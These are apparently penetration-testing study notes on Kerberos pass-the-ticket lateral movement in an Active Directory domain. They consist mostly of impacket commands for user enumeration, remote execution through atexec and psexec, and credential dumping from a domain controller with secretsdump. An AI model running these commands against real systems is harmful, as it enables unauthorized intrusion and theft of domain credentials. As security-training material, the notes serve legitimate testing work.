> Once we have a valid kerberos file (krb5cc) we can do lateral movement. We start with exporting the ticket to our env on our kali machine after transferring it over:

```
export KRB5CCNAME=<full_path_to_file>
```

> We can get details about our ticket with `klist`. If you need to remove it for any reason use:

```
unset KRB5CCNAME
```

> Now we can try and get users after our tunnel is setup:

```
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip <dc_ip> <domain>/<user>
```

> If the command is successful then we need to modify the /etc/hosts file on kali before we can try and login to our target machine:

```
sudo nano /etc/hosts

<dc_ip>  <dc_hostname>.<domain>
<target_ip>  <target_hostname>.<domain>
```

> If we get a clock skew error then run:

```
sudo ntpdate <dc_ip>
```

> Now we can try and execute a command to test:

```
python3 /usr/share/doc/python3-impacket/examples/atexec.py <domain>/<user>@<dc_hostname>.<domain> -k -no-pass -dc-ip <dc_ip> "whoami"
```

> We can also login with psexec or wmiexec:

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<user>@<dc_hostname>.<domain> -k -no-pass -dc-ip <dc_ip>
```

> We can also do secretsdump if the user is a domain admin or admin:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <domain>/<user>@<dc_hostname>.<domain> -k -no-pass -dc-ip <dc_ip>
```
